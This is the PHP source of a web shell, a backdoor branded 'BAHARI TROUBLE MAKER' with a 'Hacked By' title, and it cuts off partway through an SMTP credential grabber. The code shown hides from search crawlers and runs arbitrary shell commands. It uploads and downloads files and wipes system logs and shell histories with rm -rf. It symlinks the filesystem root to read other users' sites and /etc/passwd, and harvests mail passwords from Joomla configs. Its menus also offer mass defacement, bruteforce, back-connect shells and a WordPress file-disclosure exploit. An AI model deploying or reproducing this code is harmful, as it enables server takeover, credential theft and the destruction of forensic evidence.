<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "7153bac2333cc7d601f17f9b3889d284"; // default: faisa69
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
<title>Hacked By Mr.ToKeiChun69</title>
<meta name='author' content='BAHARI TROUBLE MAKER'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
	background-color: black;
	min-height: 100%;
	background-repeat: no-repeat;
	background-attachment: fixed;
	background-position: center;
	background-size: cover;
    color: #ffffff;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
	padding: 0px;
	-moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;	
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
	-moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;	
}



a { 
	padding: 1px; 
	border: 1px solid white; 
	color: green; 
	text-decoration: 
	none;color: white; 
	font-size:14px; 
}

a:hover {
	color: purple;
	text-decoration: underline;
}

b {
	color: purple;

}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
   overflow: hidden;
	color: black; 
	border: 1px solid black; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
	-moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;
	position:relative; 
	bottom:75px; left:300pt;
}

</style>
</head>
<script> function myFunction() {alert("Login SU..!!"); }</script>
<br><br><br>
	</form><center><ul>
	<li> <a href="" onclick="myFunction()">&nbsp;Home&nbsp;</a> </li>
	<li> <a href="" onclick="myFunction()">&nbsp;Server Infos&nbsp;</a> </li>
	</li><li> <a href="" onclick="myFunction()">&nbsp;Mass Deface&nbsp;</a> </li>
	<li> <a href="" onclick="myFunction()">&nbsp;Bypass&nbsp;</a> </li>
	<li> <a href="" onclick="myFunction()">&nbsp;Config&nbsp;</a> </li>
	<li> <a href="" onclick="myFunction()">&nbsp;Jumping&nbsp;</a> </li>
	<li> <a href="" onclick="myFunction()">&nbsp;Bruteforce&nbsp;</a> </li>
	<li> <a href="" onclick="myFunction()">&nbsp;CGI-Telnet&nbsp;</a> </li>
	<li> <a href="" onclick="myFunction()">&nbsp;Poster&nbsp;</a> </li>
	<li> <a style='color: red;' href='http://watch8x.com/'>&nbsp;Login&nbsp;</a> </li></ul>
	</center><hr>
<br><br><font color="#006600" size="3pt">Jingklong </font> <font color="#b0b000" size="3pt">-</font> <font color="#009900" size="3pt">BAHARI TROUBLE MAKER</font><br><br>
<font color="#00aa00" size="3pt">BAHARI TROUBLE MAKER Shell </font> 
<font color="#006600" size="3pt">Recoded dari beberapa tool orang untuk membuat shell ini..</font><br><br>
<font color="#006600" size="3pt">Terima Kasih dan maaf untuk shell/tool yang sudah kami ambil/recoded <font color="red" size="6pt">Aso lo Pencurry >:(</font>
<br>Shell ini dibuat semata2 untuk memudahkan kami melalukan aktivitas sebagai hekerz.. lol..<br>
"yen ono seng salah yo tulong dibenerke, tapi yen bener yo ojo disalahke.. kan iso sinau bareng.. wkkwk.." -Kata2 Seseorang :v</font><br><br><br><br><br><br><br>
<font color="#006600" size="3pt">Special thankz to : </font><br><font color="pink">Denita :*</font> - All Members BAHARI TROUBLE MAKER<br><br><br><br><font color="#006600" size="3pt">thankz to : </font><br>
AnonGhost - IDB-Team - DM - IndoXploit - dan lainnya :v (<font color="purple">Maaf yah dah ambil toolznya :"v</font>) <br><br>
<link href='http://fonts.googleapis.com/css?family=Give+You+Glory' rel='stylesheet' type='text/css'>
</center></span><footer id="ftr" style="position:fixed; left:0px; right:0px; bottom:0px; background:transparent); text-align:right;">
<font color="purple" size="3" face="Give You Glory">&copy; BAHARI TROUBLE MAKER Shell 2017</font></footer>

<form method="post">
<input type="password" name="pass">
</form>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<title>Hacked By Mr.ToKeiChun69</title>
<meta name='author' content='BAHARI TROUBLE MAKER'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
	min-height: 100%;
	background-color: black;
	background-repeat: no-repeat;
	background-attachment: fixed;
	background-position: center;
	background-size: cover;
    color: white;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
	padding: 0px;
	-moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;	
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
	-moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;	
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
	-moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
   -moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;	
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
b { 
	padding: 1px; 
	border: 1px solid white; 
	color: green; 
	text-decoration: 
	none;color: white; 
	font-size:14px; 
}
a:hover {
	color: purple;
	text-decoration: underline;
}
tr:hover {
	background: #444;
	text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan;
	color: #FFFFFF; TEXT-DECORATION: none;
	}

input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
   overflow: hidden;
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
   -moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;
}
textarea {
	overflow: hidden;
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
   -moz-border-radius: 5px;
   -webkit-border-radius: 5px;
   border-radius: 5px;
}
a:focus, input:focus, textarea:focus {
  outline: 0;
  border-color: rgba(82, 168, 236, 0.8);
  -webkit-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6);
  -moz-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6);
  box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6);

select {
	width: 152px;
	background: #000000; 
	color: lime; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
	-moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;
}
option:hover {
	background: lime;
	color: #000000;
}

</style>
</head>
<?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function findit($mytext,$starttag,$endtag) {
	 $posLeft  = stripos($mytext,$starttag)+strlen($starttag);
	 $posRight = stripos($mytext,$endtag,$posLeft+1);
	 return  substr($mytext,$posLeft,$posRight-$posLeft);
	}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}
function bing($dork) {
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
	    if($x) {
			preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
			foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
			$npage = $npage + 10;
			if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
		} else break;
	}
	$URLs = array();
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
 	$sss = count(array_unique($array));
	foreach($array as $domain) {
		echo $domain."\n";
	}
}
function reverse($url) {
	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
		  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
		  curl_setopt($ch, CURLOPT_HEADER, 0);
		  curl_setopt($ch, CURLOPT_POST, 1);
	$resp = curl_exec($ch);
	$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
	$array = explode(",,", $resp);
	unset($array[0]);
	foreach($array as $lnk) {
		$lnk = "http://$lnk";
		$lnk = str_replace(",", "", $lnk);
		echo $lnk."\n";
		ob_flush();
		flush();
	}
		curl_close($ch);
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
	$_COOKIE = idx_ss($_COOKIE);
}

if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>MYSQL</font>" : "<font color=red>MYSQL</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>CURL</font>" : "<font color=red>CURL</font>";
$wget = (exe('wget --help')) ? "<font color=lime>WGET</font>" : "<font color=red>WGET</font>";
$perl = (exe('perl --help')) ? "<font color=lime>PERL</font>" : "<font color=red>PERL</font>";
$python = (exe('python --help')) ? "<font color=lime>PYTHON</font>" : "<font color=red>PYTHON</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "<font color=lime>".$kernel."</font><br>";
echo "<font color=lime>".$user."</font> (".$uid.")-<font color=lime>".$group."</font> (".$gid.")| <font color=lime>".$ip.  " |</font>";
echo "<font color=lime>|  $used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
echo "<font color=lime>Safe Mode: $sm  |  </font>";
echo "<font color=lime>Disable Functions</font>: $show_ds<br>";
echo "| $mysql | $perl| $python | $wget | $curl |<br>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]<br>";
echo "<form method='post'>
	<font style='text-decoration: none;'> ~ $ </font>
	<input type='text' size='20' height='10' name='cmd'><input type='submit' name='do_cmd' value='X'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>  ".w($dir,"Current")." 
	<input type='radio' name='tipe_upload' value='home_root'>  ".w($_SERVER['DOCUMENT_ROOT'],"Home")." 
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;

	
echo "<hr>";
echo "<center>";
echo "<ul>";
echo "<li> <a href='?'>Home&nbsp;</a> </li>";
echo "<li> <a href='?dir=$dir&do=server'>Server Infos</a> </li>";
echo "<li> <a href='?dir=$dir&do=mass_deface'>Mass Deface</a> </li>";
echo "<li> <a href='?dir=$dir&do=baipas'>Bypass</a> </li>";
echo "<li> <a href='?dir=$dir&do=tconf'>Config</a> </li>";
echo "<li> <a href='?dir=$dir&do=symlink'>Symlink</a> </li>";
echo "<li> <a href='?dir=$dir&do=jumping'>Jumping</a> </li>";
echo "<li> <a href='?dir=$dir&do=aeu'>Auto Edit User</a> </li>";
echo "<li> <a href='?dir=$dir&do=brut'>Bruteforce</a> </li>";
echo "<li> <a href='?dir=$dir&do=cgi'>CGI-Telnet</a> </li>";
echo "<li> <a href='?dir=$dir&do=adminer'>Adminer</a> </li>";
echo "<li> <a href='?dir=$dir&do=poster'>Poster</a> </li>";
echo "<li> <a href='?dir=$dir&do=tool'>Tools</a> </li>";
echo "<li> <a href='?dir=$dir&do=nyungseb'>Delete Logs</a> </li>";
echo "<li> <a style='color: red;' href='?dir=$dir&do=modar'>Kill Shell</a> </li>";
echo "<li> <a style='color: red;' href='?logout=true'>Logout</a> </li>";
echo "</ul>";
echo "</center>";
echo "<hr>";
if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
	
}
elseif($_GET['do'] == 'modar') {
	$file = $_SERVER['PHP_SELF'];
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
	die('<br><br><b class="tmp"><font color="#ff0000" size="2pt"><center>Wes Kehapus :"</center></font></b><meta http-equiv="refresh" content="3; url=?".$pwd."" />');
	else
	echo '<font color="#fff600" size="2pt">unlink error!</font>';	
}	
elseif($_GET['do'] == 'nyungseb') {
	echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Logs Eraser</span><center><br>';
	//exec function madafuck !
	echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
	exec("rm -rf /tmp/logs");
	exec("rm -rf /root/.ksh_history");
	exec("rm -rf /root/.bash_history");
	exec("rm -rf /root/.bash_logout");
	exec("rm -rf /usr/local/apache/logs");
	exec("rm -rf /usr/local/apache/log");
	exec("rm -rf /var/apache/logs");
	exec("rm -rf /var/apache/log");
	exec("rm -rf /var/run/utmp");
	exec("rm -rf /var/logs");
	exec("rm -rf /var/log");
	exec("rm -rf /var/adm");
	exec("rm -rf /etc/wtmp");
	exec("rm -rf /etc/utmp");
	exec("rm -rf $HISTFILE");
	exec("rm -rf /var/log/lastlog");
	exec("rm -rf /var/log/wtmp");

	//shell_exec function madafuck !
	shell_exec("rm -rf /tmp/logs");
	shell_exec("rm -rf /root/.ksh_history");
	shell_exec("rm -rf /root/.bash_history");
	shell_exec("rm -rf /root/.bash_logout");
	shell_exec("rm -rf /usr/local/apache/logs");
	shell_exec("rm -rf /usr/local/apache/log");
	shell_exec("rm -rf /var/apache/logs");
	shell_exec("rm -rf /var/apache/log");
	shell_exec("rm -rf /var/run/utmp");
	shell_exec("rm -rf /var/logs");
	shell_exec("rm -rf /var/log");
	shell_exec("rm -rf /var/adm");
	shell_exec("rm -rf /etc/wtmp");
	shell_exec("rm -rf /etc/utmp");
	shell_exec("rm -rf $HISTFILE");
	shell_exec("rm -rf /var/log/lastlog");
	shell_exec("rm -rf /var/log/wtmp");

	//passthru function madafuck !
	passthru("rm -rf /tmp/logs");
	passthru("rm -rf /root/.ksh_history");
	passthru("rm -rf /root/.bash_history");
	passthru("rm -rf /root/.bash_logout");
	passthru("rm -rf /usr/local/apache/logs");
	passthru("rm -rf /usr/local/apache/log");
	passthru("rm -rf /var/apache/logs");
	passthru("rm -rf /var/apache/log");
	passthru("rm -rf /var/run/utmp");
	passthru("rm -rf /var/logs");
	passthru("rm -rf /var/log");
	passthru("rm -rf /var/adm");
	passthru("rm -rf /etc/wtmp");
	passthru("rm -rf /etc/utmp");
	passthru("rm -rf $HISTFILE");
	passthru("rm -rf /var/log/lastlog");
	passthru("rm -rf /var/log/wtmp");


	//Let the Mother of Functions To Complete The Task wkwkwkw xD!
	system("rm -rf /tmp/logs");
	sleep(2);
	echo'<br><font color="009900" face="Tahoma, Geneva, sans-serif" style="font-size: 10pt">Deleted [+].../tmp/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif>';
	sleep(2);

	system("rm -rf /root/.bash_history");
	sleep(2);
	echo'<p>Deleted [+].../root/.bash_history <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /root/.ksh_history");
	sleep(2);
	echo'<p>Deleted [+].../root/.ksh_history <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /root/.bash_logout");
	sleep(2);
	echo'<p>Deleted [+].../root/.bash_logout <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /usr/local/apache/logs");
	sleep(2);
	echo'<p>Deleted [+].../usr/local/apache/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /usr/local/apache/log");
	sleep(2);
	echo'<p>Deleted [+].../usr/local/apache/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/apache/logs");
	sleep(2);
	echo'<p>Deleted [+].../var/apache/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/apache/log");
	sleep(2);
	echo'<p>Deleted [+].../var/apache/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/run/utmp");
	sleep(2);
	echo'<p>Deleted [+].../var/run/utmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/logs");
	sleep(2);
	echo'<p>Deleted [+].../var/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/log");
	sleep(2);
	echo'<p>Deleted [+].../var/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/adm");
	sleep(2);
	echo'<p>Deleted [+].../var/adm <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /etc/wtmp");
	sleep(2);
	echo'<p>Deleted [+].../etc/wtmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /etc/utmp");
	sleep(2);
	echo'<p>Deleted [+].../etc/utmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf $HISTFILE");
	sleep(2);
	echo'<p>Deleted [+]...$HISTFILE <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>'; 

	system("rm -rf /var/log/lastlog");
	sleep(2);
	echo'<p>Deleted [+].../var/log/lastlog <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	system("rm -rf /var/log/wtmp");
	sleep(2);
	echo'<p>Deleted [+].../var/log/wtmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

	sleep(4);

	echo '</font><br><br><p><font color="00bb00" face="Tahoma, Geneva, sans-serif" style="font-size: 10pt">Your Traces Has Been Successfully Erased From the Server';
	echo"</td></tr></table>";
	
}
elseif($_GET['do'] == 'symlink') {
    if ($win) {
        echo "<center><br/><br/><nobr><span class='b9'>Symlink Is Not Available In Windows Server</span></nobr><br/><br/></center>";
    }
    @mkdir('btmsym', 0777);
    $sempak = "Options all 
 
DirectoryIndex btm.html 
 
AddType text/plain .php 
 
AddHandler server-parsed .php 
  
AddType text/plain .html 
 
AddHandler txt .html 
 
Require None 
 
Satisfy Any";
    $masuk = @fopen('btmsym/.htaccess', 'w');
    fwrite($masuk, $sempak);
    @symlink('/', 'btmsym/btm.txt');
    $pg = basename(__FILE__);
    $etc = file_get_contents("/etc/passwd");
    $etcz = explode("
", $etc);
    if (is_readable("/etc/passwd")) {
        echo '<center><br/> <table align="center" border="3" width="400" cellspacing="0" cellpadding="4">';
        echo '<tr>
<td align="center"> <font color="white"> <b>&nbsp;DOMAINS&nbsp;</b></td>
<td align="center"> <font color="white"> <b>&nbsp;USERS&nbsp;</b></td>
<td align="center"> <font color="white"> <b>&nbsp;SYMLINK&nbsp;</b></td>';
        $list = scandir("/var/named");
        foreach ($etcz as $etz) {
            $etcc = explode(":", $etz);
            foreach ($list as $domain) {
                if (strpos($domain, ".db")) {
                    $domain = str_replace('.db', '', $domain);
                    $owner = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
                    if ($owner['name'] == $etcc[0]) {
                        $i+= 1;
                        echo "<tr>
<td><a  href='http://" . $domain . " '>" . $domain . "</a></td>
<td align='center'><font color='white'>" . $owner['name'] . "</font></td>
<td align='center'><a href='btmsym/btm.txt" . $owner['dir'] . "/public_html/' target='_blank'>Symlink</a></td>";
                    }
                }
            }
        }
        flush();
        flush();
    }
    echo "</tr></table></div></html>";
	
}
elseif($_GET['do'] == 'tool') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";
}
elseif($_GET['do'] == 'smtp') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";
	echo"<center>
	<br><br><br>
	VHosts SMTP Grabber<br><br>
	<form method='post'>
	<textarea style='width: 450px; height: 150px;' name='sites' placeholder='http://domen.com/dir_config/config.txt'></textarea><br>
	<input type='submit' name='go' value='Hajar'>
	</form>";
	$ya=$_POST['go'];
	$co=$_POST['sites'];

	if($ya){
	 $e=explode("\r\n",$co);
	 foreach($e as $bda){
		//echo '<br>'.$bda;
		$linkof=''; 
		$dn=($bda).($linkof);
		$file=@file_get_contents($dn);
		if(preg_match("/JConfig|joomla/", $file)) {
		echo'<center><font face="Iceland" color=Red >----------------------------------------------</font></center>';
					echo "<font face='Iceland' color=lime >SMTP USER : </font>".findit($file,"smtpuser = '","'")."<br>";
